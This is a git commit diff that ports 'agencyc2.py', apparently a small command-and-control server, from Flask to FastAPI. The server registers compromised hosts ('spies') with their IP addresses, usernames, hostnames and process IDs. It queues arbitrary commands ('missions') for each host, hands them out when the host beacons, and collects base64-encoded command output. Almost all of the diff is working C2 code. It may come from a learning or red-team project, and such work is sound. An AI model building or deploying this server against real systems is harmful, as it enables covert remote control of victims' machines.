a39861a04a8915c76f50d4e2d07ecfa44bb5aecc
senzee <33692631+senzee1984@users.noreply.github.com>
2023-11-29 23:15:10 -0500

    Update agencyc2.py

--- agencyc2.py
+++ agencyc2.py
@@ -1,23 +1,33 @@
-from flask import Flask, request, jsonify
+from fastapi import FastAPI, HTTPException
+from pydantic import BaseModel
 import itertools
 import random
 import string
-from datetime import datetime, timedelta
+from datetime import datetime
 import base64
-from datetime import datetime  # Assuming you want to use datetime for timestamps
 
-class Listener:
-    def __init__(self, type, port, addr):
-        self.type = type
-        self.port = port
-        self.addr = addr
-	
+class RegisterRequest(BaseModel):
+    intaddr: str
+    extaddr: str
+    username: str
+    hostname: str
+    ops: str
+    pid: int
+
+class BeaconRequest(BaseModel):
+    id: int
+    active: bool
+
+class ResultRequest(BaseModel):
+    command: str
+    result: str
+
 
 class Spy:
     newId = itertools.count(start=1)
 
     def __init__(self):
-        self.id = str(next(self.newId))
+        self.id = next(self.newId)
         self.guid = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
         self.active = False
         self.intaddr = None
@@ -26,13 +36,10 @@ class Spy:
         self.hostname = None
         self.ops = None
         self.pid = None
-        self.mission = None  # Initialize mission
-#	self.completed = None
-        self.interval = None
-        self.jitter = None
+        self.mission = None
         self.firstcheckin = None
         self.lastcheckin = None
-        self.output = None
+        self.output = ""
 
     def initial_checkin(self, intaddr, extaddr, username, hostname, ops, pid):
         self.active = True
@@ -42,144 +49,83 @@ class Spy:
         self.hostname = hostname
         self.ops = ops
         self.pid = pid
-        self.firstcheckin = self.timestamp()
-        self.lastcheckin = self.timestamp()
-        self.output=""
+        self.firstcheckin = datetime.now()
+        self.lastcheckin = self.firstcheckin
+        self.output = ""
 
     def checkin(self):
-        self.lastcheckin = self.timestamp()
-        if self.mission is not None:
-            if self.mission == 'kill':
-                self.active = False
+        self.lastcheckin = datetime.now()
+        if self.mission is not None and self.mission == 'kill':
+            self.active = False
 
-    def timestamp(self):
-        return datetime.now() 
-
-listeners = []
 spies = []
+app = FastAPI()
 
-
-
-app = Flask(__name__)
-
-@app.route("/register", methods=['POST'])
-def get_register():
-    data = request.json  # Access the JSON data sent in the request
+@app.post("/register")
+async def register(request: RegisterRequest):
     newspy = Spy()
-    newspy.initial_checkin(data.get('intaddr'),data.get('extaddr'),data.get('username'),data.get('hostname'),data.get('ops'),data.get('pid'))
+    newspy.initial_checkin(request.intaddr, request.extaddr, request.username, request.hostname, request.ops, request.pid)
     spies.append(newspy)
-    spy_details = {
-        "ID": newspy.id,
-        "GUID": newspy.guid,
-        "Active": newspy.active,
-        "First Check-in": newspy.firstcheckin.isoformat() if newspy.firstcheckin else None,
-        "Last Check-in": newspy.lastcheckin.isoformat() if newspy.lastcheckin else None,
-    }
-    return jsonify(spy_details)
+    return newspy.__dict__
 
-@app.route("/spies")
-def list_spies():
-    if not spies:
-        return "<p>No spies registered.</p>"
-    response = "Number of spies: " + str(len(spies)) + "<br><br>"
-    for spy in spies:
-        spy_details = (
-            f"ID: {spy.id}<br>"
-            f"GUID: {spy.guid}<br>"
-            f"Active: {spy.active}<br>"
-            f"Internal Address: {spy.intaddr}<br>"
-            f"External Address: {spy.extaddr}<br>"
-            f"Username: {spy.username}<br>"
-            f"Hostname: {spy.hostname}<br>"
-            f"OS: {spy.ops}<br>"
-            f"PID: {spy.pid}<br>"
-            f"First Check-in: {spy.firstcheckin}<br>"
-            f"Last Check-in: {spy.lastcheckin}<br><br>"
-        )
-        response += spy_details
-    return f"<p>{response}</p>"
-
-@app.route("/spy/<id>", methods=['GET'])
-def get_spy(id):
-    if not spies:
-        return "<p>No spies registered.</p>"
-
-    for spy in spies:
-        if spy.id == id:
-            data = {
-            "id": str(spy.id),
-            "guid": spy.guid,
-            "active": str(spy.active),
-            "intaddr": str(spy.intaddr),
-            "extaddr": str(spy.extaddr),
-            "username": str(spy.username),
-            "hostname": str(spy.hostname),
-            "ops": str(spy.ops),
-            "pid": str(spy.pid),
-            "firstcheckin": str(spy.firstcheckin),
-            "lastcheckin": str(spy.lastcheckin),
-            "output": spy.output,
-        }
-    return jsonify(data)
-
-@app.route("/cls/<id>", methods=['GET'])
-def clean_output(id):
-    if not spies:
-        return "<p>No spies registered.</p>"
-
-    for spy in spies:
-        if spy.id == id:
-            spy.output=""
-    return "<p>Output cleared</p>"
+@app.post("/beacon")
+async def beacon(request: BeaconRequest):
+    spy = next((s for s in spies if s.id == request.id), None)
+    if spy:
+        spy.active = request.active
+        spy.lastcheckin = datetime.now()
+        if spy.mission:
+            mission = spy.mission
+            spy.mission = None
+            return {"command": mission}
+        return {"command": None}
+    raise HTTPException(status_code=404, detail="Spy not found")
 
 
-# Client selects a spy and specify a mission for the spy
-@app.route("/mission/<id>/<command>", methods=['GET'])  
-def receive_mission(id, command):
-    for spy in spies:
-        if spy.id == id:
-            if spy.mission != None: 
-                return "<p>The mission queue is full, please wait for the execution of current mission<p>"
-            else:
-                spy.mission=command
-                return "<p>Mission updated for spy"+spy.guid+"</p>"
-    else:
-        return "<p>The spy cannot be found<p>"
+@app.get("/spies")
+async def list_spies():
+    return [spy.__dict__ for spy in spies]
+
+@app.get("/spy/{spy_id}")
+async def get_spy(spy_id: int):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        return spy.__dict__
+    raise HTTPException(status_code=404, detail="Spy not found")
+
+@app.get("/cls/{spy_id}")
+async def clean_output(spy_id: int):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        spy.output = ""
+        return {"message": "Output cleared"}
+    raise HTTPException(status_code=404, detail="Spy not found")
+
+@app.get("/mission/{spy_id}/{command}")
+async def receive_mission(spy_id: int, command: str):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        if spy.mission is not None:
+            return {"message": "The mission queue is full, please wait for the execution of current mission"}
+        spy.mission = command
+        return {"message": f"Mission updated for spy {spy.guid}"}
+    raise HTTPException(status_code=404, detail="Spy not found")
 
 
-@app.route("/beacon", methods=['POST'])  
-def beacon():
-    data = request.json
-    spy_id = data.get('id')
+@app.post("/result/{spy_id}")
+async def get_result(spy_id: int, request: ResultRequest):
+    spy = next((s for s in spies if s.id == spy_id), None)
+    if spy:
+        result = request.result
+        result_bytes = result.encode("ascii") 
+        string_bytes = base64.b64decode(result_bytes)
+        raw = string_bytes.decode("ascii")
+        output = f"Command: {request.command}\nResult: {raw}"
+        spy.output = output
+        print(output)
+        return {"message": "Result received"}
+    raise HTTPException(status_code=404, detail="Spy not found")
 
-    for spy in spies:
-        if spy.id == spy_id:
-            spy.active = data.get('active', False)
-            spy.lastcheckin = datetime.now()
-            if spy.mission:
-                mission = spy.mission
-                spy.mission = None  # Clear the mission after assigning
-                return jsonify({"command": mission})
-            break
-    return jsonify({"command": None})
-
-
-
-@app.route("/result/<id>", methods=['POST'])  
-def get_result(id):
-    result = request.json.get('result')
-    result_bytes=result.encode("ascii") 
-    string_bytes=base64.b64decode(result_bytes)
-    raw=string_bytes.decode("ascii")
-    command = request.json.get('command')
-    output="Command: "+command+"\nResult: "+raw
-    for spy in spies:
-        if spy.id == id:
-            spy.output=output
-            print(output)   
-    return "<p>Result received</p>"
-
-
-
-if __name__ == '__main__':
-    app.run(debug=False)
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8000)
